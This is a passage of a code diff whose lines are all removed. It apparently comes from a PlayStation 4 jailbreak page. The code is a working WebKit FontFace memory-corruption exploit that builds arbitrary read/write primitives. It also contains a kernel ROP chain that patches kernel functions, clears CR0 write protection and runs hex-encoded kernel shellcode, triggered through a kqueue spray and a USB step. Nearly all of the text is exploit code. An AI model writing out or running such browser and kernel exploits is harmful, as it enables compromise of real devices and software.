-                kchain2.kwrite1(KERNEL_setuid, 0xEB);
-                kchain2.kwrite4(KERNEL_mprotect, 0x00000000);
-                kchain2.kwrite2(KERNEL_prx, 0xE990);
-                kchain2.kwrite1(KERNEL_dlsym_1, 0xEB);
-                kchain2.kwrite4(KERNEL_dlsym_2, 0xC3C03148);
-                kchain2.kwrite1(KERNEL_mmap_1, 0x37);
-                kchain2.kwrite1(KERNEL_mmap_2, 0x37);
-                kchain2.kwrite4(KERNEL_syscall11_1, 0x00000002);
-                kchain2.kwrite8_kaddr(KERNEL_syscall11_2, KERNEL_syscall11_gadget);
-                kchain2.kwrite4(KERNEL_syscall11_3, 0x00000001);
-                kchain2.kwrite4(KERNEL_setcr0_patch, 0xC3C7220F);
-                var idx5 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setcr0_patch);
-                kchain2.push(gadgets["pop rdi"]);
-                kchain2.push(0x80050033);
-                var idx5_dest = kchain2.get_rsp();
-                kchain2.pushSymbolic();
-                kchain2.finalizeSymbolic(idx5, idx5_dest);
-                kchain2.rax_kernel(KERNEL_kqueue_close_epi);
-                kchain2.push(gadgets["mov rdx, rax"]);
-                kchain2.push(gadgets["pop rsi"]);
-                kchain2.push(SAVED_KERNEL_STACK_PTR);
-                kchain2.push(gadgets["mov rax, [rsi]"]);
-                kchain2.push(gadgets["pop rcx"]);
-                kchain2.push(0x10);
-                kchain2.push(gadgets["add rax, rcx"]);
-                kchain2.push(gadgets["mov [rax], rdx"]);
-                kchain2.push(gadgets["pop rdi"]);
-                var idx6 = kchain2.pushSymbolic();
-                kchain2.push(gadgets["mov [rdi], rax"]);
-                kchain2.push(gadgets["sti"]);
-                kchain2.push(gadgets["pop rsp"]);
-                var idx6_dest = kchain2.get_rsp();
-                kchain2.pushSymbolic();
-                kchain2.finalizeSymbolic(idx6, idx6_dest);
-            }
-
-            function object_setup() {
-                var fake_knote = chain.syscall(477, 0x4000, 0x4000 * 0x3, 0x3, 0x1010, 0xFFFFFFFF, 0x0);
-                var fake_filtops = fake_knote.add32(0x4000);
-                var fake_obj = fake_knote.add32(0x8000);
-                if (fake_knote.low != 0x4000) {
-                    alert("enomem: " + fake_knote);
-                    while (1);
-                } {
-                    p.write8(fake_knote, fake_obj);
-                    p.write8(fake_knote.add32(0x68), fake_filtops)
-                } {
-                    p.write8(fake_filtops.sub32(0x79), gadgets["cli ; pop rax"]);
-                    p.write8(fake_filtops.add32(0x0), gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]);
-                    p.write8(fake_filtops.add32(0x8), kchain.stack);
-                    p.write8(fake_filtops.add32(0x10), gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]);
-                } {
-                    p.write8(fake_obj.add32(0x30), gadgets["mov rdi, [rax + 8] ; call [rax]"]);
-                }
-                chain.syscall(203, fake_knote, 0xC000);
-            }
-            var trigger_spray = function() {
-                var NUM_KQUEUES = 0x1B0;
-                var kqueue_ptr = p.malloc(NUM_KQUEUES * 0x4); {
-                    for (var i = 0; i < NUM_KQUEUES; i++) {
-                        chain.fcall(window.syscalls[362]);
-                        chain.write_result4(kqueue_ptr.add32(0x4 * i));
-                    }
-                }
-                chain.run();
-                var kqueues = p.array_from_address(kqueue_ptr, NUM_KQUEUES);
-                var that_one_socket = chain.syscall(97, 2, 1, 0);
-                if (that_one_socket.low < 0x100 || that_one_socket.low >= 0x200) {
-                    alert("invalid socket");
-                    while (1);
-                }
-                var kevent = p.malloc(0x20);
-                p.write8(kevent.add32(0x0), that_one_socket);
-                p.write4(kevent.add32(0x8), 0xFFFF + 0x010000);
-                p.write4(kevent.add32(0xC), 0x0);
-                p.write8(kevent.add32(0x10), 0x0);
-                p.write8(kevent.add32(0x18), 0x0); {
-                    for (var i = 0; i < NUM_KQUEUES; i++) {
-                        chain.fcall(window.syscalls[363], kqueues[i], kevent, 0x1, 0x0, 0x0, 0x0);
-                    }
-                }
-                chain.run(); {
-                    for (var i = 18; i < NUM_KQUEUES; i += 2) {
-                        chain.fcall(window.syscalls[6], kqueues[i]);
-                    }
-                }
-                chain.run();
-                window.progress.innerHTML = "Activating ExFatHax USB...";
-                usbWaitTime = 1 * USBWait();
-                sleep(usbWaitTime).then(() => {
-                    {
-                        for (var i = 1; i < NUM_KQUEUES; i += 2) {
-                            chain.fcall(window.syscalls[6], kqueues[i]);
-                        }
-                    }
-                    chain.run();
-                    if (chain.syscall(23, 0).low == 0) {
-                        chain.fcall(window.syscalls[73], 0x4000, 0xC000);
-                        chain.fcall(window.syscalls[325]);
-                        chain.run();
-                        var patch_buffer = chain.syscall(477, 0x0, 0x4000, 0x7, 0x1000, 0xFFFFFFFF, 0);
-                        var patch_buffer_view = p.array_from_address(patch_buffer, 0x1000);
-                        patch_buffer_view[0] = 0x00000BB8;
-                        patch_buffer_view[1] = 0xFE894800;
-                        patch_buffer_view[2] = 0x033D8D48;
-                        patch_buffer_view[3] = 0x0F000000;
-                        patch_buffer_view[4] = 0x4855C305;
-                        patch_buffer_view[5] = 0x8B48E589;
-                        patch_buffer_view[6] = 0x95E8087E;
-                        patch_buffer_view[7] = 0xE8000000;
-                        patch_buffer_view[8] = 0x00000175;
-                        patch_buffer_view[9] = 0x033615FF;
-                        patch_buffer_view[10] = 0x8B480000;
-                        patch_buffer_view[11] = 0x0003373D;
-                        patch_buffer_view[12] = 0x3F8B4800;
-                        patch_buffer_view[13] = 0x74FF8548;
-                        patch_buffer_view[14] = 0x3D8D48EB;
-                        patch_buffer_view[15] = 0x0000029D;
-                        patch_buffer_view[16] = 0xF9358B48;
-                        patch_buffer_view[17] = 0x48000002;
-                        patch_buffer_view[18] = 0x0322158B;
-                        patch_buffer_view[19] = 0x8B480000;
-                        patch_buffer_view[20] = 0x00D6E812;
-                        patch_buffer_view[21] = 0x8D480000;
-                        patch_buffer_view[22] = 0x00029F3D;
-                        patch_buffer_view[23] = 0x358B4800;
-                        patch_buffer_view[24] = 0x000002E4;
-                        patch_buffer_view[25] = 0x05158B48;
-                        patch_buffer_view[26] = 0x48000003;
-                        patch_buffer_view[27] = 0xB9E8128B;
-                        patch_buffer_view[28] = 0x48000000;
-                        patch_buffer_view[29] = 0x02633D8D;
-                        patch_buffer_view[30] = 0x8B480000;
-                        patch_buffer_view[31] = 0x0002BF35;
-                        patch_buffer_view[32] = 0x158B4800;
-                        patch_buffer_view[33] = 0x000002C8;
-                        patch_buffer_view[34] = 0xE8128B48;
-                        patch_buffer_view[35] = 0x0000009C;
-                        patch_buffer_view[36] = 0x7A3D8D48;
-                        patch_buffer_view[37] = 0x48000002;
-                        patch_buffer_view[38] = 0x02AA358B;
-                        patch_buffer_view[39] = 0x8B480000;
-                        patch_buffer_view[40] = 0x0002AB15;
-                        patch_buffer_view[41] = 0x128B4800;
-                        patch_buffer_view[42] = 0x00007FE8;
-                        patch_buffer_view[43] = 0x0185E800;
-                        patch_buffer_view[44] = 0xC35D0000;
-                        patch_buffer_view[45] = 0x6D3D8948;
-                        patch_buffer_view[46] = 0x48000002;
-                        patch_buffer_view[47] = 0x026E3D01;
-                        patch_buffer_view[48] = 0x01480000;
-                        patch_buffer_view[49] = 0x00026F3D;
-                        patch_buffer_view[50] = 0x3D014800;
-                        patch_buffer_view[51] = 0x00000270;
-                        patch_buffer_view[52] = 0x713D0148;
-                        patch_buffer_view[53] = 0x48000002;
-                        patch_buffer_view[54] = 0x02723D01;
-                        patch_buffer_view[55] = 0x01480000;
-                        patch_buffer_view[56] = 0x0002933D;
-                        patch_buffer_view[57] = 0x3D014800;
-                        patch_buffer_view[58] = 0x00000294;
-                        patch_buffer_view[59] = 0x653D0148;
-                        patch_buffer_view[60] = 0x48000002;
-                        patch_buffer_view[61] = 0x02663D01;
-                        patch_buffer_view[62] = 0x01480000;
-                        patch_buffer_view[63] = 0x0002873D;
-                        patch_buffer_view[64] = 0x3D014800;
-                        patch_buffer_view[65] = 0x00000288;
-                        patch_buffer_view[66] = 0x893D0148;
-                        patch_buffer_view[67] = 0x48000002;
-                        patch_buffer_view[68] = 0x028A3D01;
-                        patch_buffer_view[69] = 0x01480000;
-                        patch_buffer_view[70] = 0x00028B3D;
-                        patch_buffer_view[71] = 0x3D014800;
-                        patch_buffer_view[72] = 0x0000024C;
-                        patch_buffer_view[73] = 0x3D3D0148;
-                        patch_buffer_view[74] = 0xC3000002;
-                        patch_buffer_view[75] = 0xE5894855;
-                        patch_buffer_view[76] = 0x10EC8348;
-                        patch_buffer_view[77] = 0x24348948;
-                        patch_buffer_view[78] = 0x24548948;
-                        patch_buffer_view[79] = 0xED15FF08;
-                        patch_buffer_view[80] = 0x48000001;
-                        patch_buffer_view[81] = 0x4B74C085;
-                        patch_buffer_view[82] = 0x48C28948;
-                        patch_buffer_view[83] = 0x4840408B;
-                        patch_buffer_view[84] = 0x2F74C085;
-                        patch_buffer_view[85] = 0x28788B48;
-                        patch_buffer_view[86] = 0x243C3B48;
-                        patch_buffer_view[87] = 0x8B480A74;
-                        patch_buffer_view[88] = 0xC0854800;
-                        patch_buffer_view[89] = 0xECEB1D74;
-                        patch_buffer_view[90] = 0x18788B48;
-                        patch_buffer_view[91] = 0x74FF8548;
-                        patch_buffer_view[92] = 0x7F8B48ED;
-                        patch_buffer_view[93] = 0x7C3B4810;
-                        patch_buffer_view[94] = 0xE2750824;
-                        patch_buffer_view[95] = 0xFF1040C7;
-                        patch_buffer_view[96] = 0x48FFFFFF;
-                        patch_buffer_view[97] = 0x31107A8D;
-                        patch_buffer_view[98] = 0x31D231F6;
-                        patch_buffer_view[99] = 0xA515FFC9;
-                        patch_buffer_view[100] = 0x48000001;
-                        patch_buffer_view[101] = 0x5D10C483;
-                        patch_buffer_view[102] = 0x894855C3;
-                        patch_buffer_view[103] = 0xC0200FE5;
-                        patch_buffer_view[104] = 0xFFFF2548;
-                        patch_buffer_view[105] = 0x220FFFFE;
-                        patch_buffer_view[106] = 0x3D8B48C0;
-                        patch_buffer_view[107] = 0x000001C8;
-                        patch_buffer_view[108] = 0x909007C7;
-                        patch_buffer_view[109] = 0x47C79090;
-                        patch_buffer_view[110] = 0x48909004;
-                        patch_buffer_view[111] = 0x358B48B8;
-                        patch_buffer_view[112] = 0x000001AC;
-                        patch_buffer_view[113] = 0x08778948;
-                        patch_buffer_view[114] = 0x651047C7;
-                        patch_buffer_view[115] = 0xC73C8B48;
-                        patch_buffer_view[116] = 0x00251447;
-                        patch_buffer_view[117] = 0x47C70000;
-                        patch_buffer_view[118] = 0x89480018;
-                        patch_buffer_view[119] = 0x1C47C738;
-                        patch_buffer_view[120] = 0xB8489090;
-                        patch_buffer_view[121] = 0x7D358B48;
-                        patch_buffer_view[122] = 0x48000001;
-                        patch_buffer_view[123] = 0xC7207789;
-                        patch_buffer_view[124] = 0xC7482847;
-                        patch_buffer_view[125] = 0x47C70100;
-                        patch_buffer_view[126] = 0x0000002C;
-                        patch_buffer_view[127] = 0x778D48E9;
-                        patch_buffer_view[128] = 0x158B4834;
-                        patch_buffer_view[129] = 0x00000150;
-                        patch_buffer_view[130] = 0x89F22948;
-                        patch_buffer_view[131] = 0x8B483057;
-                        patch_buffer_view[132] = 0x00016B35;
-                        patch_buffer_view[133] = 0x568D4800;
-                        patch_buffer_view[134] = 0xD7294805;
-                        patch_buffer_view[135] = 0xC148FF89;
-                        patch_buffer_view[136] = 0x814808E7;
-                        patch_buffer_view[137] = 0x0000E9CF;
-                        patch_buffer_view[138] = 0x3E894800;
-                        patch_buffer_view[139] = 0x00000D48;
-                        patch_buffer_view[140] = 0x220F0001;
-                        patch_buffer_view[141] = 0x55C35DC0;
-                        patch_buffer_view[142] = 0x0FE58948;
-                        patch_buffer_view[143] = 0x2548C020;
-                        patch_buffer_view[144] = 0xFFFEFFFF;
-                        patch_buffer_view[145] = 0x48C0220F;
-                        patch_buffer_view[146] = 0x013A3D8B;
-                        patch_buffer_view[147] = 0x07C70000;
-                        patch_buffer_view[148] = 0x00C3C031;
-                        patch_buffer_view[149] = 0x353D8B48;
-                        patch_buffer_view[150] = 0xC7000001;
-                        patch_buffer_view[151] = 0xC3C03107;
-                        patch_buffer_view[152] = 0x3D8B4800;
-                        patch_buffer_view[153] = 0x00000130;
-                        patch_buffer_view[154] = 0xC03107C7;
-                        patch_buffer_view[155] = 0x8B4800C3;
-                        patch_buffer_view[156] = 0x00012B3D;
-                        patch_buffer_view[157] = 0x3107C700;
-                        patch_buffer_view[158] = 0x4800C3C0;
-                        patch_buffer_view[159] = 0x00A63D8B;
-                        patch_buffer_view[160] = 0x87C70000;
-                        patch_buffer_view[161] = 0x001F1E01;
-                        patch_buffer_view[162] = 0x9090F631;
-                        patch_buffer_view[163] = 0x1E0587C7;
-                        patch_buffer_view[164] = 0xC931001F;
-                        patch_buffer_view[165] = 0x87C79090;
-                        patch_buffer_view[166] = 0x001F1E09;
-                        patch_buffer_view[167] = 0x9090D231;
-                        patch_buffer_view[168] = 0x1E3E87C7;
-                        patch_buffer_view[169] = 0xC931001F;
-                        patch_buffer_view[170] = 0x0D489090;
-                        patch_buffer_view[171] = 0x00010000;
-                        patch_buffer_view[172] = 0xFFC0220F;
-                        patch_buffer_view[173] = 0x0000EF15;
-                        patch_buffer_view[174] = 0xC0200F00;
-                        patch_buffer_view[175] = 0xFFFF2548;
-                        patch_buffer_view[176] = 0x220FFFFE;
-                        patch_buffer_view[177] = 0x3D8B48C0;
-                        patch_buffer_view[178] = 0x000000DC;
-                        patch_buffer_view[179] = 0xC03107C7;
-                        patch_buffer_view[180] = 0x0D4800C3;
-                        patch_buffer_view[181] = 0x00010000;
-                        patch_buffer_view[182] = 0x5DC0220F;
-                        patch_buffer_view[183] = 0x737973C3;
-                        patch_buffer_view[184] = 0x5F6D6574;
-                        patch_buffer_view[185] = 0x70737573;
-                        patch_buffer_view[186] = 0x5F646E65;
-                        patch_buffer_view[187] = 0x73616870;
-                        patch_buffer_view[188] = 0x705F3265;
-                        patch_buffer_view[189] = 0x735F6572;
-                        patch_buffer_view[190] = 0x00636E79;
-                        patch_buffer_view[191] = 0x74737973;
-                        patch_buffer_view[192] = 0x725F6D65;
-                        patch_buffer_view[193] = 0x6D757365;
-                        patch_buffer_view[194] = 0x68705F65;
-                        patch_buffer_view[195] = 0x32657361;
-                        patch_buffer_view[196] = 0x73797300;
-                        patch_buffer_view[197] = 0x5F6D6574;
-                        patch_buffer_view[198] = 0x75736572;
-                        patch_buffer_view[199] = 0x705F656D;
-                        patch_buffer_view[200] = 0x65736168;
-                        patch_buffer_view[201] = 0x90900033;
-                        patch_buffer_view[202] = 0x00000000;
-                        patch_buffer_view[203] = 0x00000000;
-                        patch_buffer_view[204] = 0x000F88F0;
-                        patch_buffer_view[205] = 0x00000000;
-                        patch_buffer_view[206] = 0x002EF170;
-                        patch_buffer_view[207] = 0x00000000;
-                        patch_buffer_view[208] = 0x00018DF0;
-                        patch_buffer_view[209] = 0x00000000;
-                        patch_buffer_view[210] = 0x00018EF0;
-                        patch_buffer_view[211] = 0x00000000;
-                        patch_buffer_view[212] = 0x02654110;
-                        patch_buffer_view[213] = 0x00000000;
-                        patch_buffer_view[214] = 0x00097230;
-                        patch_buffer_view[215] = 0x00000000;
-                        patch_buffer_view[216] = 0x00402E60;
-                        patch_buffer_view[217] = 0x00000000;
-                        patch_buffer_view[218] = 0x01520108;
-                        patch_buffer_view[219] = 0x00000000;
-                        patch_buffer_view[220] = 0x01520100;
-                        patch_buffer_view[221] = 0x00000000;
-                        patch_buffer_view[222] = 0x00462D20;
-                        patch_buffer_view[223] = 0x00000000;
-                        patch_buffer_view[224] = 0x00462DFC;
-                        patch_buffer_view[225] = 0x00000000;
-                        patch_buffer_view[226] = 0x006259A0;
-                        patch_buffer_view[227] = 0x00000000;
-                        patch_buffer_view[228] = 0x006268D0;
-                        patch_buffer_view[229] = 0x00000000;
-                        patch_buffer_view[230] = 0x00625DC0;
-                        patch_buffer_view[231] = 0x00000000;
-                        patch_buffer_view[232] = 0x00626290;
-                        patch_buffer_view[233] = 0x00000000;
-                        patch_buffer_view[234] = 0x00626720;
-                        patch_buffer_view[235] = 0x00000000; {
-                            chain.fcall(window.syscalls[203], patch_buffer, 0x4000);
-                            chain.fcall(patch_buffer, p.read8(KERNEL_BASE_PTR));
-                            chain.fcall(window.syscalls[73], patch_buffer, 0x4000);
-                        }
-                        chain.run();
-                        setTimeout(hen, 150);
-                    } else {
-                        disableUSB();
-                        alert("Failed. Please try again");
-                        p.write8(0, 0);
-                    }
-                });
-            }
-            var PAGE_SIZE = 16384;
-            var SIZEOF_CSS_FONT_FACE = 0xb8;
-            var HASHMAP_BUCKET = 208;
-            var STRING_OFFSET = 20;
-            var SPRAY_FONTS = 0x100a;
-            var GUESS_FONT = 8602845184;
-            var NPAGES = 20;
-            var INVALID_POINTER = 0;
-            var HAMMER_FONT_NAME = "font8";
-            var HAMMER_NSTRINGS = 700;
-
-            function poc() {
-                function hex(n) {
-                    if ((typeof n) != "number") return "" + n;
-                    return "0x" + (new Number(n)).toString(16);
-                }
-                var union = new ArrayBuffer(8);
-                var union_b = new Uint8Array(union);
-                var union_i = new Uint32Array(union);
-                var union_f = new Float64Array(union);
-                var bad_fonts = [];
-                for (var i = 0; i < SPRAY_FONTS; i++) bad_fonts.push(new FontFace("font1", "", {}));
-                var good_font = new FontFace("font2", "url(data:text/html,)", {});
-                bad_fonts.push(good_font);
-                var arrays = [];
-                for (var i = 0; i < 512; i++) arrays.push(new Array(31));
-                arrays[256][0] = 1.5;
-                arrays[257][0] = {};
-                arrays[258][0] = 1.5;
-                var jsvalue = {
-                    a: arrays[256],
-                    b: new Uint32Array(1),
-                    c: true
-                };
-                var string_atomifier = {};
-                var string_id = 10000000;
-
-                function ptrToString(p) {
-                    var s = '';
-                    for (var i = 0; i < 8; i++) {
-                        s += String.fromCharCode(p % 256);
-                        p = (p - p % 256) / 256;
-                    }
-                    return s;
-                }
-
-                function stringToPtr(p, o) {
-                    if (o === undefined) o = 0;
-                    var ans = 0;
-                    for (var i = 7; i >= 0; i--) ans = 256 * ans + p.charCodeAt(o + i);
-                    return ans;
-                }
-                var strings = [];
-
-                function mkString(l, head) {
-                    var s = head + '\u0000'.repeat(l - STRING_OFFSET - 8 - head.length) + (string_id++);
-                    string_atomifier[s] = 1;
-                    strings.push(s);
-                    return s;
-                }
-                var guf = GUESS_FONT;
-                var ite = true;
-                var matches = 0;
-                var round = 0;
-                window.ffses = {};
-                do {
-                    var p_s = ptrToString(NPAGES + 2);
-                    for (var i = 0; i < NPAGES; i++) p_s += ptrToString(guf + i * PAGE_SIZE);
-                    p_s += ptrToString(INVALID_POINTER);
-                    for (var i = 0; i < 256; i++) mkString(HASHMAP_BUCKET, p_s);
-                    var ffs = ffses["search_" + (++round)] = new FontFaceSet(bad_fonts);
-                    var badstr1 = mkString(HASHMAP_BUCKET, p_s);
-                    var guessed_font = null;
-                    var guessed_addr = null;
-                    for (var i = 0; i < SPRAY_FONTS; i++) {
-                        bad_fonts[i].family = "search" + round;
-                        if (badstr1.substr(0, p_s.length) != p_s) {
-                            guessed_font = i;
-                            var p_s1 = badstr1.substr(0, p_s.length);
-                            for (var i = 1; i <= NPAGES; i++) {
-                                if (p_s1.substr(i * 8, 8) != p_s.substr(i * 8, 8)) {
-                                    guessed_addr = stringToPtr(p_s.substr(i * 8, 8));
-                                    break;
-                                }
-                            }
-                            if (matches++ == 0) {
-                                guf = guessed_addr + 2 * PAGE_SIZE;
-                                guessed_addr = null;
-                            }
-                            break;
-                        }
-                    }
-                    if ((ite = !ite)) guf += NPAGES * PAGE_SIZE;
-                }
-                while (guessed_addr === null);
-                var p_s = '';
-                p_s += ptrToString(26);
-                p_s += ptrToString(guessed_addr);
-                p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
-                for (var i = 0; i < 19; i++) p_s += ptrToString(INVALID_POINTER);
-                for (var i = 0; i < 256; i++) mkString(HASHMAP_BUCKET, p_s);
-                var needfix = [];
-                for (var i = 0;; i++) {
-                    ffses["ffs_leak_" + i] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], good_font]);
-                    var badstr2 = mkString(HASHMAP_BUCKET, p_s);
-                    needfix.push(mkString(HASHMAP_BUCKET, p_s));
-                    bad_fonts[guessed_font].family = "evil2";
-                    bad_fonts[guessed_font + 1].family = "evil3";
-                    var leak = stringToPtr(badstr2.substr(badstr2.length - 8));
-                    if (leak < 0x1000000000000) break;
-                }
-
-                function makeReader(read_addr, ffs_name) {
-                    var fake_s = '';
-                    fake_s += '0000';
-                    fake_s += '\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff';
-                    fake_s += ptrToString(read_addr);
-                    fake_s += ptrToString(0x80000014);
-                    p_s = '';
-                    p_s += ptrToString(29);
-                    p_s += ptrToString(guessed_addr);
-                    p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
-                    p_s += ptrToString(guessed_addr + 2 * SIZEOF_CSS_FONT_FACE);
-                    for (var i = 0; i < 18; i++) p_s += ptrToString(INVALID_POINTER);
-                    for (var i = 0; i < 256; i++) mkString(HASHMAP_BUCKET, p_s);
-                    var the_ffs = ffses[ffs_name] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], bad_fonts[guessed_font + 2], good_font]);
-                    mkString(HASHMAP_BUCKET, p_s);
-                    var relative_read = mkString(HASHMAP_BUCKET, fake_s);
-                    bad_fonts[guessed_font].family = ffs_name + "_evil1";
-                    bad_fonts[guessed_font + 1].family = ffs_name + "_evil2";
-                    bad_fonts[guessed_font + 2].family = ffs_name + "_evil3";
-                    needfix.push(relative_read);
-                    if (relative_read.length < 1000) return makeReader(read_addr, ffs_name + '_');
-                    return relative_read;
-                }
-                var fastmalloc = makeReader(leak, 'ffs3');
-                for (var i = 0; i < 100000; i++) mkString(128, '');
-                var props = [];
-                for (var i = 0; i < 0x10000; i++) {
-                    props.push({
-                        value: 0x41434442
-                    });
-                    props.push({
-                        value: jsvalue
-                    });
-                }
-                Object.defineProperties({}, props);
-                for (var i = fastmalloc.indexOf("\u0042\u0044\u0043\u0041\u0000\u0000\u00fe\u00ff");; i += 16) {
-                    if (fastmalloc.charCodeAt(i) == 0x42 && fastmalloc.charCodeAt(i + 1) == 0x44 && fastmalloc.charCodeAt(i + 2) == 0x43 && fastmalloc.charCodeAt(i + 3) == 0x41 && fastmalloc.charCodeAt(i + 4) == 0 && fastmalloc.charCodeAt(i + 5) == 0 && fastmalloc.charCodeAt(i + 6) == 254 && fastmalloc.charCodeAt(i + 7) == 255 && fastmalloc.charCodeAt(i + 24) == 14) {
-                        var jsvalue_leak = stringToPtr(fastmalloc, i + 32);
-                        break;
-                    }
-                }
-                var rd_leak = makeReader(jsvalue_leak, 'ffs4');
-                var array256 = stringToPtr(rd_leak, 16);
-                var ui32a = stringToPtr(rd_leak, 24);
-                var rd_arr = makeReader(array256, 'ffs5');
-                var butterfly = stringToPtr(rd_arr, 8);
-                var rd_ui32 = makeReader(ui32a, 'ffs6');
-                for (var i = 0; i < 8; i++) union_b[i] = rd_ui32.charCodeAt(i);
-                var structureid_low = union_i[0];
-                var structureid_high = union_i[1];
-                union_i[0] = 0x10000;
-                union_i[1] = 0;
-                arrays[257][1] = {};
-                arrays[257][0] = union_f[0];
-                union_i[0] = (guessed_addr + 12 * SIZEOF_CSS_FONT_FACE) | 0;
-                union_i[1] = (guessed_addr - guessed_addr % 0x100000000) / 0x100000000;
-                arrays[256][i] = union_f[0];
-                pp_s = '';
-                pp_s += ptrToString(56);
-                for (var i = 0; i < 12; i++) pp_s += ptrToString(guessed_addr + i * SIZEOF_CSS_FONT_FACE);
-                var fake_s = '';
-                fake_s += '0000';
-                fake_s += ptrToString(INVALID_POINTER);
-                fake_s += ptrToString(butterfly);
-                fake_s += '\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000';
-                var ffs7_args = [];
-                for (var i = 0; i < 12; i++) ffs7_args.push(bad_fonts[guessed_font + i]);
-                ffs7_args.push(good_font);
-                var ffs8_args = [bad_fonts[guessed_font + 12]];
-                for (var i = 0; i < 5; i++) ffs8_args.push(new FontFace(HAMMER_FONT_NAME, "url(data:text/html,)", {}));
-                for (var i = 0; i < HAMMER_NSTRINGS; i++) mkString(HASHMAP_BUCKET, pp_s);
-                ffses.ffs7 = new FontFaceSet(ffs7_args);
-                mkString(HASHMAP_BUCKET, pp_s);
-                ffses.ffs8 = new FontFaceSet(ffs8_args);
-                var post_ffs = mkString(HASHMAP_BUCKET, fake_s);
-                needfix.push(post_ffs);
-                for (var i = 0; i < 13; i++) bad_fonts[guessed_font + i].family = "hammer" + i;
-
-                function boot_addrof(obj) {
-                    arrays[257][32] = obj;
-                    union_f[0] = arrays[258][0];
-                    return union_i[1] * 0x100000000 + union_i[0];
-                }
-
-                function boot_fakeobj(addr) {
-                    union_i[0] = addr;
-                    union_i[1] = (addr - addr % 0x100000000) / 0x100000000;
-                    arrays[258][0] = union_f[0];
-                    return arrays[257][32];
-                }
-                var arw_master = new Uint32Array(8);
-                var arw_slave = new Uint8Array(1);
-                var obj_master = new Uint32Array(8);
-                var obj_slave = {
-                    obj: null
-                };
-                var addrof_slave = boot_addrof(arw_slave);
-                var addrof_obj_slave = boot_addrof(obj_slave);
-                union_i[0] = structureid_low;
-                union_i[1] = structureid_high;
-                union_b[6] = 7;
-                var obj = {
-                    jscell: union_f[0],
-                    butterfly: true,
-                    buffer: arw_master,
-                    size: 0x5678
-                };
-
-                function i48_put(x, a) {
-                    a[4] = x | 0;
-                    a[5] = (x / 4294967296) | 0;
-                }
-
-                function i48_get(a) {
-                    return a[4] + a[5] * 4294967296;
-                }
-                window.addrof = function(x) {
-                    obj_slave.obj = x;
-                    return i48_get(obj_master);
-                }
-                window.fakeobj = function(x) {
-                    i48_put(x, obj_master);
-                    return obj_slave.obj;
-                }
-
-                function read_mem_setup(p, sz) {
-                    i48_put(p, arw_master);
-                    arw_master[6] = sz;
-                }
-                window.read_mem_s = function(p, sz) {
-                    read_mem_setup(p, sz);
-                    return "" + arw_slave;
-                }
-                window.read_mem_b = function(p, sz) {
-                    read_mem_setup(p, sz);
-                    var b = new Uint8Array(sz);
-                    b.set(arw_slave);
-                    return b;
-                }
-                window.read_mem_as_string = function(p, sz) {
-                    var x = read_mem_b(p, sz);
-                    var ans = '';
-                    for (var i = 0; i < x.length; i++) ans += String.fromCharCode(x[i]);
-                    return ans;
-                }
-                window.ref_mem = function(p, sz) {
-                    read_mem_setup(p, sz);
-                    return arw_slave;
-                }
-                window.read_mem = function(p, sz) {
-                    read_mem_setup(p, sz);
-                    var arr = [];
-                    for (var i = 0; i < sz; i++) arr.push(arw_slave[i]);
-                    return arr;
-                };
-                window.write_mem = function(p, data) {
-                    read_mem_setup(p, data.length);
-                    for (var i = 0; i < data.length; i++) arw_slave[i] = data[i];
-                };
-                window.read_ptr_at = function(p) {
-                    var ans = 0;
-                    var d = read_mem(p, 8);
-                    for (var i = 7; i >= 0; i--) ans = 256 * ans + d[i];
-                    return ans;
-                };
-                window.write_ptr_at = function(p, d) {
-                    var arr = [];
-                    for (var i = 0; i < 8; i++) {
-                        arr.push(d & 0xff);
-                        d /= 256;
-                    }
-                    write_mem(p, arr);
-                };
-                (function() {
-                    var magic = boot_fakeobj(boot_addrof(obj) + 16);
-                    magic[4] = addrof_slave;
-                    magic[5] = (addrof_slave - addrof_slave % 0x100000000) / 0x100000000;
-                    obj.buffer = obj_master;
-                    magic[4] = addrof_obj_slave;
-                    magic[5] = (addrof_obj_slave - addrof_obj_slave % 0x100000000) / 0x100000000;
-                    magic = null;
-                })();
-                (function() {
-                    var ffs_addr = read_ptr_at(addrof(post_ffs) + 8) - 208;
-                    write_mem(ffs_addr, read_mem(ffs_addr - 96, 208));
-                    for (var i = 0; i < needfix.length; i++) {
-                        var addr = read_ptr_at(addrof(needfix[i]) + 8);
-                        write_ptr_at(addr, (HASHMAP_BUCKET - 20) * 0x100000000 + 1);
-                        write_ptr_at(addr + 8, addr + 20);
-                        write_ptr_at(addr + 16, 0x80000014);
-                    }
-                    write_ptr_at(butterfly + 248, 0x1f0000001f);
-                })();
-                var expl_master = new Uint32Array(8);
-                var expl_slave = new Uint32Array(2);
-                var addrof_expl_slave = addrof(expl_slave);
-                var m = fakeobj(addrof(obj) + 16);
-                obj.buffer = expl_slave;
-                m[7] = 1;
-                obj.buffer = expl_master;
-                m[4] = addrof_expl_slave;
-                m[5] = (addrof_expl_slave - addrof_expl_slave % 0x100000000) / 0x100000000;
-                m[7] = 1;
-                var prim = {
-                    write8: function(addr, value) {
-                        expl_master[4] = addr.low;
-                        expl_master[5] = addr.hi;
-                        if (value instanceof int64) {
-                            expl_slave[0] = value.low;
-                            expl_slave[1] = value.hi;
-                        } else {
-                            expl_slave[0] = value;
-                            expl_slave[1] = 0;
-                        }
-                    },
-                    write4: function(addr, value) {
-                        expl_master[4] = addr.low;
-                        expl_master[5] = addr.hi;
-                        if (value instanceof int64) {
-                            expl_slave[0] = value.low;
-                        } else {
-                            expl_slave[0] = value;
-                        }
-                    },
-                    write2: function(addr, value) {
-                        expl_master[4] = addr.low;
-                        expl_master[5] = addr.hi;
-                        var tmp = expl_slave[0] & 0xFFFF0000;
-                        if (value instanceof int64) {
-                            expl_slave[0] = ((value.low & 0xFFFF) | tmp);
-                        } else {
-                            expl_slave[0] = ((value & 0xFFFF) | tmp);
-                        }
-                    },
-                    write1: function(addr, value) {
-                        expl_master[4] = addr.low;
-                        expl_master[5] = addr.hi;
-                        var tmp = expl_slave[0] & 0xFFFFFF00;
-                        if (value instanceof int64) {
-                            expl_slave[0] = ((value.low & 0xFF) | tmp);
-                        } else {
